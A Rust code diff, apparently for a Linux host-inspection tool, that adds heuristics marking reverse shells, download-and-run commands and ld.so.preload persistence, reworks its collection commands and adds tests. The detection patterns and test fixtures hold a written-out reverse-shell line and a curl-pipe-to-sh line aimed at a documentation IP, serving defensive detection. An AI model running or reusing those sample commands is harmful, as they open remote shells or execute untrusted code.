@@ -331,6 +331,15 @@ impl SystemInfoTable {
             })?;
         SystemInfoDetailRequest::from_row(self.tab, row)
     }
+
+    /// Whether asking for this row's detail would return anything.
+    ///
+    /// Most tabs have no detail command at all, and of the ones that do, a row
+    /// whose identity does not parse has none either. A window that offers the
+    /// detail regardless can only offer a button that fails.
+    pub fn row_has_detail(&self, row: &SystemInfoRow) -> bool {
+        SystemInfoDetailRequest::from_row(self.tab, row).is_ok_and(|request| request.is_some())
+    }
 }
 
 #[derive(Debug, Clone, Eq, PartialEq)]
@@ -7133,24 +7142,76 @@ const fn primary_key_columns(tab: SystemInfoTab) -> &'static [usize] {
     }
 }
 
+/// Whether something is fetched and then handed straight to a shell.
+///
+/// Split on the pipe and look at the first word after it, so that `| sh &`
+/// counts and `| sha256sum` does not.
+fn pipes_into_a_shell(text: &str) -> bool {
+    const SHELLS: [&str; 3] = ["sh", "bash", "zsh"];
+    text.split('|').skip(1).any(|segment| {
+        let word = segment.trim_start();
+        SHELLS.iter().any(|shell| {
+            word.strip_prefix(shell).is_some_and(|rest| {
+                rest.is_empty() || rest.starts_with([' ', '&', ';', '>', '\t', ')', '\'', '"'])
+            })
+        })
+    })
+}
+
+/// The shapes worth marking wherever they turn up, whatever the tab.
+///
+/// The word rules below only notice a risk the collecting command already
+/// named, which serves the few tabs that emit a risk column and does nothing
+/// for the rest. A boot script that opens a shell back to an address is the
+/// one row 启动项汇总 exists to surface, and it went out unmarked among
+/// fourteen ordinary ones — which is the same as not collecting it.
+fn hostile_shape(text: &str) -> Option<SystemInfoRisk> {
+    const CERTAIN: [&str; 6] = [
+        // A shell with its input and output redirected to a socket.
+        "/dev/tcp/",
+        // An interactive shell where there is nobody to be interactive with.
+        "bash -i",
+        "nc -e",
+        "ncat -e",
+        // A library forced into every process that starts.
+        "ld.so.preload",
+        "ld_preload=",
+    ];
+    if CERTAIN.iter().any(|needle| text.contains(needle)) {
+        return Some(SystemInfoRisk::High);
+    }
+    if pipes_into_a_shell(text) || text.contains("setsid ") || text.contains("chattr +i") {
+        return Some(SystemInfoRisk::Warning);
+    }
+    None
+}
+
+/// Whether a cell *is* one of these words, rather than merely containing one.
+///
+/// The generic state words are only meaningful when the collecting command put
+/// them in a column of their own. Matched anywhere in the row they also fire on
+/// prose — a login script commenting `# colored GCC warnings and errors` came
+/// back marked, and two false marks in three hundred lines is how an operator
+/// learns to stop reading the marks.
+fn a_cell_says(cells: &[String], words: &[&str]) -> bool {
+    cells.iter().any(|cell| {
+        let value = cell.trim().to_lowercase();
+        words.contains(&value.as_str())
+    })
+}
+
 fn infer_risk(cells: &[String]) -> SystemInfoRisk {
     let text = cells.join(" ").to_lowercase();
-    if ["high", "critical", "malicious", "backdoor", "高危", "危险"]
-        .iter()
-        .any(|needle| text.contains(needle))
-    {
+    // These are specific enough that finding them anywhere means something:
+    // no ordinary line says NOPASSWD by accident.
+    let named_high = ["malicious", "backdoor", "高危", "危险"];
+    let named_warning = ["nopasswd", "可疑", "异常", "失败"];
+    if a_cell_says(cells, &["high", "critical"]) || named_high.iter().any(|w| text.contains(w)) {
         SystemInfoRisk::High
-    } else if [
-        "warning",
-        "suspicious",
-        "failed",
-        "nopasswd",
-        "可疑",
-        "异常",
-        "失败",
-    ]
-    .iter()
-    .any(|needle| text.contains(needle))
+    } else if let Some(risk) = hostile_shape(&text) {
+        risk
+    } else if a_cell_says(cells, &["warning", "suspicious", "failed"])
+        || named_warning.iter().any(|w| text.contains(w))
     {
         SystemInfoRisk::Warning
     } else {
@@ -7237,18 +7298,108 @@ printf 'connections\t'; (ss -H -tun 2>/dev/null || netstat -tun 2>/dev/null | ta
 awk -F'[: ]+' 'NR>2 && $1!="lo"{rx+=$3;tx+=$11} END{printf "rx\t%.0f\ntx\t%.0f\n",rx,tx}' /proc/net/dev 2>/dev/null"#;
 
 const PROCESS_COMMAND: &str = r#"ps -eo pid=,ppid=,user=,stat=,pcpu=,pmem=,etimes=,args= --no-headers 2>/dev/null | head -n 500 | awk '{risk="normal"; cmd=""; for(i=8;i<=NF;i++) cmd=cmd (i==8?"":" ") $i; if($4 ~ /^Z/ || $5+0>=80) risk="warning"; gsub(/\t/," ",cmd); print risk"\t"$1"\t"$2"\t"$3"\t"$4"\t"$5"\t"$6"\t"$7"\t"cmd}'"#;
-const NETWORK_COMMAND: &str = r#"if command -v ss >/dev/null 2>&1; then ss -H -tunap 2>/dev/null | head -n 500 | awk '{proc=""; for(i=7;i<=NF;i++) proc=proc (i==7?"":" ") $i; gsub(/\t/," ",proc); pid=proc; sub(/^.*pid=/,"",pid); sub(/,.*/,"",pid); if(pid !~ /^[0-9]+$/) pid=""; print $1"\t"$5"\t"$6"\t"$2"\t"pid"\t"proc}'; else netstat -tunap 2>/dev/null | tail -n +3 | head -n 500 | awk '{proc=$7; gsub(/\t/," ",proc); pid=proc; sub(/\/.*/,"",pid); if(pid !~ /^[0-9]+$/) pid=""; print $1"\t"$4"\t"$5"\t"$6"\t"pid"\t"proc}'; fi"#;
-const SERVICES_COMMAND: &str = r#"systemctl list-units --type=service --all --no-pager --no-legend 2>/dev/null | head -n 500 | awk '{desc=""; for(i=5;i<=NF;i++) desc=desc (i==5?"":" ") $i; gsub(/\t/," ",desc); print $1"\t"$4"\t"$3"\t"desc}'"#;
-const ESTABLISHED_COMMAND: &str = r#"if command -v ss >/dev/null 2>&1; then ss -H -tnp state established 2>/dev/null | head -n 500 | awk '{proc=""; for(i=6;i<=NF;i++) proc=proc (i==6?"":" ") $i; gsub(/\t/," ",proc); pid=proc; sub(/^.*pid=/,"",pid); sub(/,.*/,"",pid); if(pid !~ /^[0-9]+$/) pid=""; port=$5; sub(/^.*:/,"",port); print $4"\t"$5"\t"port"\t"pid"\t"proc"\t"}'; else netstat -tnp 2>/dev/null | awk '$6=="ESTABLISHED" {proc=$7; gsub(/\t/," ",proc); pid=proc; sub(/\/.*/,"",pid); if(pid !~ /^[0-9]+$/) pid=""; port=$5; sub(/^.*:/,"",port); print $4"\t"$5"\t"port"\t"pid"\t"proc"\t"}' | head -n 500; fi"#;
-const OPEN_PORTS_COMMAND: &str = r#"if command -v ss >/dev/null 2>&1; then ss -H -tulnp 2>/dev/null | head -n 500 | awk '{local=$5; port=local; sub(/^.*:/,"",port); addr=substr(local,1,length(local)-length(port)-1); gsub(/^\[/,"",addr); gsub(/\]$/,"",addr); proc=""; for(i=7;i<=NF;i++) proc=proc (i==7?"":" ") $i; gsub(/\t/," ",proc); pid=proc; sub(/^.*pid=/,"",pid); sub(/,.*/,"",pid); if(pid !~ /^[0-9]+$/) pid=""; print $1"\t"addr"\t"port"\t"pid"\t"proc"\t"}'; else netstat -tulnp 2>/dev/null | tail -n +3 | head -n 500 | awk '{local=$4; port=local; sub(/^.*:/,"",port); addr=substr(local,1,length(local)-length(port)-1); gsub(/^\[/,"",addr); gsub(/\]$/,"",addr); proc=$7; gsub(/\t/," ",proc); pid=proc; sub(/\/.*/,"",pid); if(pid !~ /^[0-9]+$/) pid=""; print $1"\t"addr"\t"port"\t"pid"\t"proc"\t"}'; fi"#;
+/// A socket's owning process, read out of what `ss` prints.
+///
+/// `ss` reports the owner as `users:(("nginx",pid=13,fd=6))`, and the tab used
+/// to put that whole string in the 进程 column. An operator scanning for a
+/// process that should not be listening had to read `ss` syntax to find the
+/// name in it. The name and the pid are pulled out instead, and both come from
+/// the *first* entry so that a socket shared by several processes reports a pid
+/// and a name that belong to each other.
+///
+/// The quotes `ss` puts round the name are dropped by keeping only the
+/// characters a process name and a pid are made of, rather than by naming the
+/// quote character: an awk program written inside a shell command inside a Rust
+/// string is three levels of quoting deep, and this file has already lost two
+/// tabs for a year to one quote too many.
+/// Written once because it was wrong in four places at once: the stray quote
+/// that blanked two tabs was copied along with the program it lived in.
+macro_rules! socket_owner_awk {
+    () => {
+        r#"blob=""; if (match($0, /users:\(\(.*\)\)/)) blob=substr($0, RSTART, RLENGTH); gsub(/[^A-Za-z0-9_.:=,()\/ -]/, "", blob); name=""; if (match(blob, /\(\([^,)]+/)) name=substr(blob, RSTART+2, RLENGTH-2); pid=""; if (match(blob, /pid=[0-9]+/)) pid=substr(blob, RSTART+4, RLENGTH-4); "#
+    };
+}
+
+/// The account a socket belongs to. `ss -e` prints `uid:` only when it is not
+/// root, so an absent field means uid 0. `/etc/passwd` is read as awk's first
+/// input to turn the number into the name the operator knows.
+macro_rules! socket_user_awk {
+    () => {
+        r#"uid="0"; if (match($0, /[ \t]uid:[0-9]+/)) uid=substr($0, RSTART+5, RLENGTH-5); user=(uid in U ? U[uid] : uid); "#
+    };
+}
+
+/// The first name wins, the way `getpwuid` resolves it. A second account
+/// sharing uid 0 is a common backdoor, and letting the later line win renamed
+/// every root-owned socket after the backdoor's own name.
+macro_rules! passwd_awk {
+    () => {
+        r#"NR==FNR{split($0,P,":"); if (!(P[3] in U)) U[P[3]]=P[1]; next} "#
+    };
+}
+
+const NETWORK_COMMAND: &str = concat!(
+    r#"if command -v ss >/dev/null 2>&1; then ss -H -tunap 2>/dev/null | head -n 500 | awk '{"#,
+    socket_owner_awk!(),
+    r#"print $1"\t"$5"\t"$6"\t"$2"\t"pid"\t"name}'; else netstat -tunap 2>/dev/null | tail -n +3 | head -n 500 | awk '{prog=""; pid=""; if (match($0, /[0-9]+\/[^ ]+/)) {prog=substr($0, RSTART, RLENGTH); pid=prog; sub(/\/.*/, "", pid); sub(/^[0-9]+\//, "", prog)} print $1"\t"$4"\t"$5"\t"$6"\t"pid"\t"prog}'; fi"#,
+);
+/// Services, on a host that has systemd and on a host that does not.
+///
+/// `systemctl` answers for most of the fleet, but a container, an Alpine box
+/// and an older release have no systemd at all, and the tab came back empty on
+/// all of them — an empty service list on a machine that has just been broken
+/// into reads as "nothing is running", which is the opposite of the truth.
+/// The fallback walks the init scripts instead, and decides "running" from
+/// what the kernel says is running: a process whose name starts with the
+/// script's (ssh -> sshd, mariadb -> mariadbd), or a live pid file.
+const SERVICES_COMMAND: &str = r#"svc=""; if command -v systemctl >/dev/null 2>&1; then svc=$(systemctl list-units --type=service --all --no-pager --no-legend 2>/dev/null | head -n 500 | awk '{desc=""; for(i=5;i<=NF;i++) desc=desc (i==5?"":" ") $i; gsub(/\t/," ",desc); print $1"\t"$4"\t"$3"\t"desc}'); fi; if [ -n "$svc" ]; then printf '%s\n' "$svc"; elif [ -d /etc/init.d ]; then running=$(cat /proc/[0-9]*/comm 2>/dev/null | sort -u | tr '\n' ' '); for s in /etc/init.d/*; do [ -f "$s" ] && [ -x "$s" ] || continue; n=${s##*/}; case "$n" in README*|skeleton|rc|rcS|functions) continue;; esac; en="未启用"; for l in /etc/rc[2345].d/S*"$n" /etc/runlevels/*/"$n"; do if [ -e "$l" ]; then en="开机启动"; break; fi; done; st="已停止"; case " $running " in *" $n"*) st="运行中";; esac; if [ "$st" = "已停止" ]; then for p in /run/"$n".pid /var/run/"$n".pid /run/"$n"/*.pid /var/run/"$n"/*.pid; do [ -f "$p" ] || continue; pid=$(tr -dc 0-9 < "$p" 2>/dev/null); if [ -n "$pid" ] && [ -d /proc/"$pid" ]; then st="运行中"; break; fi; done; fi; desc=$(sed -n 's/^#[[:space:]]*Short-Description:[[:space:]]*//p' "$s" 2>/dev/null | head -n 1); [ -n "$desc" ] || desc=$(sed -n 's/^#[[:space:]]*Provides:[[:space:]]*//p' "$s" 2>/dev/null | head -n 1); printf '%s\t%s\t%s\t%s\n' "$n" "$st" "$en" "$desc"; done | head -n 500; fi"#;
+/// Outbound connections, whose columns were reading one field too far along.
+///
+/// `ss -tnp state established` drops the State column that `ss -tunap` prints,
+/// so its rows are `Recv-Q Send-Q Local Peer Process` — five fields, not the
+/// six the old program indexed. It put the peer address under 本地地址 and the
+/// raw process string under 远程地址, and read the remote port out of the
+/// process string. Every row this tab has ever shown named the wrong end of the
+/// connection, which is the one thing the tab exists to tell you.
+const ESTABLISHED_COMMAND: &str = concat!(
+    r#"if command -v ss >/dev/null 2>&1; then ss -H -tnp -e state established 2>/dev/null | head -n 500 | awk '"#,
+    passwd_awk!(),
+    r#"{port=$4; sub(/^.*:/, "", port); "#,
+    socket_owner_awk!(),
+    socket_user_awk!(),
+    r#"print $3"\t"$4"\t"port"\t"pid"\t"name"\t"user}' /etc/passwd -; else netstat -tnp 2>/dev/null | awk '$6=="ESTABLISHED"{port=$5; sub(/^.*:/, "", port); prog=""; pid=""; if (match($0, /[0-9]+\/[^ ]+/)) {prog=substr($0, RSTART, RLENGTH); pid=prog; sub(/\/.*/, "", pid); sub(/^[0-9]+\//, "", prog)} print $4"\t"$5"\t"port"\t"pid"\t"prog"\t"}' | head -n 500; fi"#,
+);
+/// Listening ports. The 用户 column was printed as a bare trailing tab and so
+/// was empty on every row of every host; `ss -e` reports the owning uid, and
+/// `/etc/passwd` turns it into a name.
+const OPEN_PORTS_COMMAND: &str = concat!(
+    r#"if command -v ss >/dev/null 2>&1; then ss -H -tulnp -e 2>/dev/null | head -n 500 | awk '"#,
+    passwd_awk!(),
+    r#"{local=$5; port=local; sub(/^.*:/, "", port); addr=substr(local, 1, length(local)-length(port)-1); gsub(/^\[|\]$/, "", addr); "#,
+    socket_owner_awk!(),
+    socket_user_awk!(),
+    r#"print $1"\t"addr"\t"port"\t"pid"\t"name"\t"user}' /etc/passwd -; else netstat -tulnp 2>/dev/null | tail -n +3 | head -n 500 | awk '{local=$4; port=local; sub(/^.*:/, "", port); addr=substr(local, 1, length(local)-length(port)-1); gsub(/^\[|\]$/, "", addr); prog=""; pid=""; if (match($0, /[0-9]+\/[^ ]+/)) {prog=substr($0, RSTART, RLENGTH); pid=prog; sub(/\/.*/, "", pid); sub(/^[0-9]+\//, "", prog)} print $1"\t"addr"\t"port"\t"pid"\t"prog"\t"}'; fi"#,
+);
 const USERS_COMMAND: &str =
     r#"getent passwd 2>/dev/null | head -n 500 | awk -F: '{print $1"\t"$3"\t"$4"\t"$6"\t"$7}'"#;
-const AUTOSTART_COMMAND: &str = r#"systemctl list-unit-files --type=service --state=enabled --no-pager --no-legend 2>/dev/null | head -n 500 | awk '{print $1"\t"$1"\t"$2"\tsystemd"}'"#;
+/// What starts by itself, on a host with systemd and on one without.
+///
+/// The runlevel links are the whole answer on a SysV host and were not read at
+/// all, so the tab was blank there — and blank is the most dangerous answer a
+/// persistence tab can give.
+const AUTOSTART_COMMAND: &str = r#"units=""; if command -v systemctl >/dev/null 2>&1; then units=$(systemctl list-unit-files --type=service --state=enabled --no-pager --no-legend 2>/dev/null | head -n 500 | awk '{print $1"\t"$1"\t"$2"\tsystemd"}'); fi; if [ -n "$units" ]; then printf '%s\n' "$units"; else for l in /etc/rc[2345].d/S* /etc/runlevels/*/*; do [ -e "$l" ] || continue; n=${l##*/}; case "$n" in S[0-9][0-9]*) n=${n#S??};; esac; t=$(readlink -f "$l" 2>/dev/null); [ -n "$t" ] || t="$l"; printf '%s\t%s\tenabled\tinit.d\n' "$n" "$t"; done | sort -u | head -n 500; fi"#;
 const CRON_COMMAND: &str = r#"for f in /etc/crontab /etc/cron.d/*; do [ -f "$f" ] || continue; awk -v src="$f" 'NF && $1 !~ /^#/ {cmd=""; for(i=7;i<=NF;i++) cmd=cmd (i==7?"":" ") $i; gsub(/\t/," ",cmd); print $6"\t"$1" "$2" "$3" "$4" "$5"\t"cmd"\t"src}' "$f" 2>/dev/null; done | head -n 500"#;
 const SSH_KEYS_COMMAND: &str = r#"for f in /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys; do [ -f "$f" ] || continue; u=$(stat -c %U "$f" 2>/dev/null); awk -v u="$u" -v f="$f" 'NF>=2 && $1 !~ /^#/ {comment=""; for(i=3;i<=NF;i++) comment=comment (i==3?"":" ") $i; print u"\t"$1"\t"$2"\t"comment"\t"f}' "$f"; done | head -n 500"#;
 const LOGIN_HISTORY_COMMAND: &str = r#"last -Faiw 2>/dev/null | head -n 200 | awk 'NF>=3 && $1 !~ /^(wtmp|btmp|reboot|shutdown)$/ {time=""; for(i=4;i<=NF;i++) time=time (i==4?"":" ") $i; gsub(/\t/," ",time); print $1"\t"$2"\t"$3"\t"time"\tlogin"}'"#;
 const SUID_COMMAND: &str = r#"find /bin /sbin /usr/bin /usr/sbin /usr/local/bin -xdev -type f \( -perm -4000 -o -perm -2000 \) -printf '%p\t%m\t%u\t%s\t%TY-%Tm-%TdT%TH:%TM:%TS\tnormal\n' 2>/dev/null | head -n 500"#;
-const AUTORUNS_COMMAND: &str = r#"systemctl list-unit-files --type=service --state=enabled --no-pager --no-legend 2>/dev/null | head -n 300 | awk '{print "systemd\t"$1"\t"$2"\t"$1"\t"}'"#;
+/// Everywhere a thing can arrange to run again, gathered in one place.
+///
+/// It used to list enabled systemd units and nothing else, which is the one
+/// persistence location an attacker is least likely to use because it is the
+/// one everybody looks at. `rc.local`, a file dropped in `/etc/profile.d`, a
+/// line in `/etc/ld.so.preload` and a `@reboot` crontab entry all survive a
+/// reboot just as well and none of them appeared here at all.
+const AUTORUNS_COMMAND: &str = r#"{ if command -v systemctl >/dev/null 2>&1; then systemctl list-unit-files --type=service --state=enabled --no-pager --no-legend 2>/dev/null | head -n 200 | awk '{print "systemd\t"$1"\t"$2"\t"$1"\troot"}'; fi; for l in /etc/rc[2345].d/S* /etc/runlevels/*/*; do [ -e "$l" ] || continue; n=${l##*/}; case "$n" in S[0-9][0-9]*) n=${n#S??};; esac; t=$(readlink -f "$l" 2>/dev/null); [ -n "$t" ] || t="$l"; printf 'init.d\t%s\t开机启动\t%s\troot\n' "$n" "$t"; done | sort -u; seen=""; for f in /etc/rc.local /etc/rc.d/rc.local; do [ -f "$f" ] || continue; rp=$(readlink -f "$f" 2>/dev/null); [ -n "$rp" ] || rp="$f"; case " $seen " in *" $rp "*) continue;; esac; seen="$seen $rp"; o=$(stat -c %U "$f" 2>/dev/null); s=未设置执行位; [ -x "$f" ] && s=开机执行; grep -v -e '^[[:space:]]*#' -e '^[[:space:]]*$' -e '^[[:space:]]*exit' "$f" 2>/dev/null | tr '\t' ' ' | head -n 20 | while IFS= read -r line; do printf 'rc.local\t%s\t%s\t%s\t%s\n' "${f##*/}" "$s" "$line" "$o"; done; done; for f in /etc/profile.d/*.sh; do [ -f "$f" ] || continue; o=$(stat -c %U "$f" 2>/dev/null); c=$(grep -v -e '^[[:space:]]*#' -e '^[[:space:]]*$' "$f" 2>/dev/null | head -n 2 | tr '\n\t' '  '); [ -n "$c" ] || c="$f"; printf 'profile.d\t%s\t登录执行\t%s\t%s\n' "${f##*/}" "$c" "$o"; done; if [ -f /etc/ld.so.preload ]; then o=$(stat -c %U /etc/ld.so.preload 2>/dev/null); tr '\t' ' ' < /etc/ld.so.preload 2>/dev/null | head -n 20 | while IFS= read -r line; do [ -n "$line" ] || continue; printf 'ld.so.preload\t%s\t强制预加载\t%s\t%s\n' ld.so.preload "$line" "$o"; done; fi; for f in /var/spool/cron/crontabs/* /var/spool/cron/* /etc/cron.d/*; do [ -f "$f" ] || continue; u=${f##*/}; grep '@reboot' "$f" 2>/dev/null | tr '\t' ' ' | head -n 10 | while IFS= read -r line; do printf 'cron @reboot\t%s\t开机执行\t%s\t%s\n' "$u" "$line" "$u"; done; done; } 2>/dev/null | head -n 500"#;
 const FIREWALL_COMMAND: &str = r#"iptables-save 2>/dev/null | grep '^-A ' | head -n 500 | awk '{rule=$0; gsub(/\t/," ",rule); print $2"\t\t\t\t\t"rule}'"#;
 const ENV_COMMAND: &str = r#"env 2>/dev/null | sort | head -n 500 | awk -F= '{name=$1; value=substr($0,length(name)+2); risk=(name=="LD_PRELOAD" || name=="LD_LIBRARY_PATH" ? "warning" : "normal"); gsub(/\t/," ",value); print name"\t"value"\t"risk}'"#;
 const SHELL_CONFIG_COMMAND: &str = r#"for f in /etc/profile /etc/bash.bashrc /root/.bashrc /home/*/.bashrc; do [ -f "$f" ] || continue; owner=$(stat -c %U "$f" 2>/dev/null); mtime=$(stat -c %Y "$f" 2>/dev/null); awk -v f="$f" -v o="$owner" -v m="$mtime" '{line=$0; gsub(/\t/," ",line); risk=(line ~ /(curl|wget|nc |ncat|LD_PRELOAD|\/dev\/tcp)/ ? "warning" : "normal"); print f"\t"o"\t"m"\t"NR"\t"line"\t"risk}' "$f"; done | head -n 1000"#;
@@ -7271,6 +7422,126 @@ mod tests {
     use uuid::Uuid;
 
     use super::*;
+
+    /// A row nobody labelled still has to stand out when it should.
+    #[test]
+    fn a_boot_entry_that_opens_a_shell_outward_is_marked_without_being_labelled() {
+        let reverse_shell = row(&[
+            "rc.local",
+            "rc.local",
+            "开机执行",
+            "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1 &",
+            "root",
+        ]);
+        assert_eq!(infer_risk(&reverse_shell), SystemInfoRisk::High);
+
+        let downloaded_and_run = row(&[
+            "profile.d",
+            "00-locale.sh",
+            "登录执行",
+            "curl -fsSL http://198.51.100.7/l.sh | sh &",
+            "root",
+        ]);
+        assert_eq!(infer_risk(&downloaded_and_run), SystemInfoRisk::Warning);
+
+        let preload = row(&[
+            "ld.so.preload",
+            "ld.so.preload",
+            "强制预加载",
+            "/x/y.so",
+            "root",
+        ]);
+        assert_eq!(infer_risk(&preload), SystemInfoRisk::High);
+
+        // The ordinary rows it sits among stay ordinary; a tab where everything
+        // is marked says no more than a tab where nothing is.
+        for ordinary in [
+            row(&["init.d", "nginx", "开机启动", "/etc/init.d/nginx", "root"]),
+            row(&["init.d", "ssh", "开机启动", "/etc/init.d/ssh", "root"]),
+            row(&["systemd", "cron.service", "enabled", "cron.service", "root"]),
+            // Checksums are piped about all day and are not shells.
+            row(&[
+                "cron",
+                "root",
+                "0 3 * * *",
+                "sha256sum /etc/passwd | sha256sum",
+                "",
+            ]),
+        ] {
+            assert_eq!(
+                infer_risk(&ordinary),
+                SystemInfoRisk::Normal,
+                "{ordinary:?}"
+            );
+        }
+    }
+
+    fn row(cells: &[&str]) -> Vec<String> {
+        cells.iter().map(|cell| (*cell).to_owned()).collect()
+    }
+
+    /// A word in a column of its own is a verdict; the same word in a line of
+    /// shell is a word.
+    #[test]
+    fn a_state_word_only_counts_when_the_command_put_it_in_its_own_column() {
+        // The collector said so: a risk column, a systemd state.
+        assert_eq!(
+            infer_risk(&row(&[
+                "/root/.bashrc",
+                "root",
+                "1",
+                "12",
+                "export X=1",
+                "warning"
+            ])),
+            SystemInfoRisk::Warning,
+        );
+        assert_eq!(
+            infer_risk(&row(&["nginx.service", "failed", "enabled", "web server"])),
+            SystemInfoRisk::Warning,
+        );
+
+        // The file merely mentions it.
+        for prose in [
+            row(&[
+                "/root/.bashrc",
+                "root",
+                "1",
+                "40",
+                "# colored GCC warnings and errors",
+                "normal",
+            ]),
+            row(&[
+                "/root/.bashrc",
+                "root",
+                "1",
+                "41",
+                "#export GCC_COLORS='error=01;31:warning=01;35'",
+                "normal",
+            ]),
+            row(&[
+                "sshd.service",
+                "running",
+                "enabled",
+                "OpenSSH server, logs failed logins",
+            ]),
+        ] {
+            assert_eq!(infer_risk(&prose), SystemInfoRisk::Normal, "{prose:?}");
+        }
+
+        // A rule that grants a passwordless shell is still found inside its cell,
+        // because nothing says NOPASSWD by accident.
+        assert_eq!(
+            infer_risk(&row(&[
+                "operator",
+                "ALL",
+                "ALL",
+                "NOPASSWD:ALL",
+                "/etc/sudoers.d/90"
+            ])),
+            SystemInfoRisk::Warning,
+        );
+    }
 
     /// Every quote in an awk program has to close.
     ///
